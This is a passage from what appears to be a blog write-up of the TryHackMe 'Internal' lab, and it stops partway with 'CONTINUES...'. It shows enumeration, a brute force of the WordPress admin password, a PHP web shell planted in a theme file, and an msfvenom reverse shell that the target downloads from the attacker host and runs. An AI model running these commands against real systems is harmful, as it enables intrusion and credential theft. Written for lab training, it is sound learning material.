+++
title = 'Internal Write Up'
date = 2024-02-14T08:50:55+02:00
draft = false
tags = ["tryhackme", "security", "pentest", "oscp"]
+++

Box: Internal/
Platform: Try Hack Me/
Grade: Medium/

## Service Enumeration

````
sudo nmap -sC -sV 10.10.52.194

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds
````

### SSH

OpenSSH 7.6p1. 

### Web

Apache httpd 2.4.29.

Only default page is shown. The logical next step is to try to find the directory structure of the server.

```
gobuster dir -u http://10.10.52.194 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --no-error

http://10.10.52.194/phpmyadmin/index.php
http://10.10.52.194/blog
http://10.10.52.194/wordpress
```

It seems the site is running Worpress. Trying to log to phpmyadmin with default credentials doesn't work. Browsing to /wordpress shows that the page tries to reach out to its own domain name internal.thm. Adding that to /etc/hosts.

### Wordpress

Running WPScan to reveal potential vulnerabilities.

````
sudo wpscan -e ap -t 500 --url http://internal.thm/blog
````

WordPress 5.4.2 and no plugins installed. Which is a bummer because plugins are a great point of entry. 

Trying the WP admin panel at http://internal.thm/blog/wp-login.php to enumerate valid usernames. Admin is a valid user according to error message.

At this point I couldn't find an obvious vulnerability for WP so I resorted to trying to brute force the admin login. I'm not a fan of brute forcing anything so this should be used as a last resort if nothing else offers an opportunity. 

````
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://internal.thm/wordpress
````

Much to my surprise brute force attempt was succesful and I found the admin password. The next step is easy. Let's attempt to exploit WP Themes Editor. 

## Initial Access

So logged in as admin browsing to Theme Editor.
Edit Twenty Seventeen: 404 Template

```
# Adding a simple web shell after the initial comments.
system($_GET[cmd]);

# Testing the shell
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=id
```

````
# Enumerating OS users
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=cat+/etc/passwd

aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
````

So it seems that the system has one standard user and one service account user which suggest MySQL runs on the box. 

Webshell works but the next step is to upgrade the shell. 

## Shell Upgrade

````
# Create shell and listener
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.67.91 LPORT=4444 -f elf > shell.elf
rlwrap nc -nvlp 4444

# Enable Python web server
python -m http.server 8000

# Execute the shell
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=curl+http://10.11.67.91:8000/shell.elf+-o+/tmp/shell.elf 
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=chmod+700+/tmp/shell.elf   
curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php?cmd=/tmp/shell.elf 

# Upgrade to interactive
python -c 'import pty; pty.spawn("/bin/bash")'
````

## Operating System Enumeration

The config file wp-config.php reveals a hardcoded MySQL username and password.

```
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

<ss$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
define( 'DB_USER', 'wordpress' );
```

## MySQL Enumeration

````
show databases;
use wordpress;
show tables;
select * from wp_users;
````

Only admin user was found. It doesn't give anything new as I already have WP admin account. 




CONTINUES...